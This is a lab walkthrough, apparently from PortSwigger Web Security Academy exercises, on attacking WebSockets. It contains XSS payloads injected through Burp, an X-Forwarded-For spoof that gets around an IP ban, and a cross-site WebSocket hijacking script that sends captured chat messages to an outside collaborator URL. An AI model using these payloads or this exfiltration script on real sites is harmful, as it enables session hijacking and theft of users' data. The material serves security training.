# Web Socket

## Description

WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

### Manipulating WebSocket messages to exploit vulnerabilities

Using the browser, send a new message containing a < character.
In Burp Proxy, find the corresponding WebSocket message and observe that the < has been HTML-encoded by the client before sending.
Ensure that Burp Proxy is configured to intercept WebSocket messages, then send another chat message.
Edit the intercepted message to contain the following payload:

<img src=1 onerror='alert(1)'>
Observe that an alert is triggered in the browser. This will also happen in the support agent's browser.

### Manipulating the WebSocket handshake to exploit vulnerabilities

Edit and resend the message containing a basic XSS payload, such as:

<img src=1 onerror='alert(1)'>
Observe that the attack has been blocked, and that your WebSocket connection has been terminated.
Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
Add the following header to the handshake request to spoof your IP address:

X-Forwarded-For: 1.1.1.1
Click "Connect" to successfully reconnect the WebSocket.
Send a WebSocket message containing an obfuscated XSS payload, such as:

<img src=1 oNeRrOr=alert`1`>

### Cross-site WebSocket hijacking

Right-click on the handshake request and select "Copy URL".
In the browser, go to the exploit server and paste the following template into the "Body" section:

<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
Replace your-websocket-url with the URL from the WebSocket handshake (your-lab-id.web-security-academy.net/chat). Make sure you change the protocol from https:// to wss://. Replace your-collaborator-url with a payload generated by Burp Collaborator Client.
Click "View exploit".

